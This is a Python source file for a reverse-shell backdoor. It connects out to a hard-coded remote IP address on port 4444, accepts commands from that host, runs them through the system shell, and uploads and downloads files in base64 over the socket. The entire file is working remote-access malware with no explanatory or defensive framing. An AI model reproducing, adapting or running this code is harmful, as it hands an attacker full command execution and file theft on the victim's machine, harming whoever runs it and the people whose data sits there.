#!/usr/bin/env python3
import socket
import subprocess
import json
import os
import base64
import sys


class Backdoor:
    def __init__(self, ip="31.131.27.207", port=4444):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    @staticmethod
    def execute_system_command(command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except subprocess.CalledProcessError as e:
            return e.output

    def reliable_send(self, data):
        json_data = json.dumps(data.decode("cp1251"))
        self.connection.send(bytes(json_data, "cp1251"))

    def reliable_receive(self):
        json_data = bytes("", "cp1251")
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def cd(path):
        os.chdir(path)
        return bytes("WD -> " + path, "cp1251")

    @staticmethod
    def write_file(path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "Upload Successful."

    @staticmethod
    def read_file(path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def run(self):
        # noinspection PyBroadException
        try:
            while True:
                command = self.reliable_receive()
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.cd(command[1])
                    self.reliable_send(command_result)
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                    self.reliable_send(command_result)
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                    self.reliable_send(bytes(command_result, "cp1251"))
                else:
                    command_result = self.execute_system_command(command)
                    self.reliable_send(command_result)
        except Exception as e:
            self.reliable_send(bytes(str(e), "cp1251"))
            self.run()

try:
    my_backdoor = Backdoor()
    my_backdoor.run()
except Exception:
    print("Connection not established.")
    sys.exit()
